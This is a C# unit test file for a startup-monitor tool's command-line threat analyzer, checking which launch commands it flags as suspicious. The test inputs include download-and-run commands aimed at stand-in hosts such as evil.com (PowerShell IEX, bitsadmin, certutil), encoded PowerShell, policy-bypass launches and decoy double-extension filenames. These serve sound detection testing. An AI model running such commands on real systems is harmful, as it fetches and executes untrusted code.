using StartupMonitor.Shared.Helpers;
using StartupMonitor.Shared.Models;
using Xunit;

namespace StartupMonitor.Tests.Helpers;

public class CliHeuristicAnalyzerTests
{
    [Theory]
    [InlineData(null, null)]
    [InlineData("", "")]
    [InlineData("   ", "   ")]
    public void Analyze_EmptyOrNull_ReturnsNoThreat(string? cmd, string? path)
    {
        var result = CliHeuristicAnalyzer.Analyze(cmd, path);
        Assert.False(result.HasThreat);
        Assert.Equal(CliThreatLevel.None, result.ThreatLevel);
        Assert.Empty(result.Indicators);
    }

    [Theory]
    [InlineData("C:\\Program Files\\Google\\Chrome\\chrome.exe", null)]
    [InlineData("notepad.exe", "C:\\Windows\\System32\\notepad.exe")]
    [InlineData("\"C:\\Program Files\\Git\\bin\\bash.exe\" --login", "C:\\Program Files\\Git\\bin\\bash.exe")]
    [InlineData("explorer.exe", null)]
    public void Analyze_LegitimateApps_ReturnsNoThreat(string cmd, string? path)
    {
        var result = CliHeuristicAnalyzer.Analyze(cmd, path);
        Assert.False(result.HasThreat);
        Assert.Equal(CliThreatLevel.None, result.ThreatLevel);
    }

    [Theory]
    [InlineData("powershell.exe -enc SQBFAFgA")]
    [InlineData("pwsh.exe -encodedcommand SQBFAFgA")]
    [InlineData("powershell -e JABjACAAPQA...")]
    public void Analyze_PowerShellBase64_ReturnsHighThreat(string cmd)
    {
        var result = CliHeuristicAnalyzer.Analyze(cmd);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.High, result.ThreatLevel);
        Assert.Equal("Base64 скрипт", result.BadgeText);
        Assert.Contains(result.Indicators, i => i.Contains("Base64"));
    }

    [Fact]
    public void Analyze_InlineBase64_ReturnsHighThreat()
    {
        var cmd = "cmd.exe /c [Convert]::FromBase64String('aGVsbG8=')";
        var result = CliHeuristicAnalyzer.Analyze(cmd);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.High, result.ThreatLevel);
        Assert.Equal("Base64 скрипт", result.BadgeText);
    }

    [Theory]
    [InlineData("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\"")]
    [InlineData("bitsadmin /transfer myJob http://malware.org/x.exe C:\\temp\\x.exe")]
    [InlineData("certutil -urlcache -split -f http://test.com/payload.exe payload.exe")]
    public void Analyze_Downloaders_ReturnsHighThreat(string cmd)
    {
        var result = CliHeuristicAnalyzer.Analyze(cmd);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.High, result.ThreatLevel);
        Assert.Equal("Сетевой загрузчик", result.BadgeText);
    }

    [Theory]
    [InlineData("invoice.pdf.exe", null)]
    [InlineData("photo.jpg.scr", "C:\\Photos\\photo.jpg.scr")]
    [InlineData("statement.docx.cmd", null)]
    public void Analyze_DoubleExtensions_ReturnsHighThreat(string cmd, string? path)
    {
        var result = CliHeuristicAnalyzer.Analyze(cmd, path);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.High, result.ThreatLevel);
        Assert.Equal("Маскировка расширения", result.BadgeText);
        Assert.Contains(result.Indicators, i => i.Contains("Double decoy extension"));
    }

    [Fact]
    public void Analyze_HiddenAndBypass_ReturnsHighThreat()
    {
        var cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File script.ps1";
        var result = CliHeuristicAnalyzer.Analyze(cmd);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.High, result.ThreatLevel);
        Assert.Equal("Скрытый обход политик", result.BadgeText);
    }

    [Theory]
    [InlineData("C:\\Users\\User\\AppData\\Local\\Temp\\update.exe")]
    [InlineData("C:\\Windows\\Temp\\loader.exe")]
    [InlineData("C:\\Users\\Public\\malware.exe")]
    [InlineData("C:\\PerfLogs\\stealth.exe")]
    public void Analyze_SuspiciousLocations_ReturnsMediumThreat(string path)
    {
        var result = CliHeuristicAnalyzer.Analyze(null, path);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.Medium, result.ThreatLevel);
        Assert.Equal("Запуск из Temp", result.BadgeText);
    }

    [Fact]
    public void Analyze_HiddenOnly_ReturnsMediumThreat()
    {
        var cmd = "wscript.exe //B script.vbs -w hidden";
        var result = CliHeuristicAnalyzer.Analyze(cmd);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.Medium, result.ThreatLevel);
        Assert.Equal("Скрытый запуск", result.BadgeText);
    }

    [Fact]
    public void Analyze_BypassOnly_ReturnsMediumThreat()
    {
        var cmd = "powershell.exe -ExecutionPolicy Bypass -File run.ps1";
        var result = CliHeuristicAnalyzer.Analyze(cmd);
        Assert.True(result.HasThreat);
        Assert.Equal(CliThreatLevel.Medium, result.ThreatLevel);
        Assert.Equal("Обход политик", result.BadgeText);
    }
}

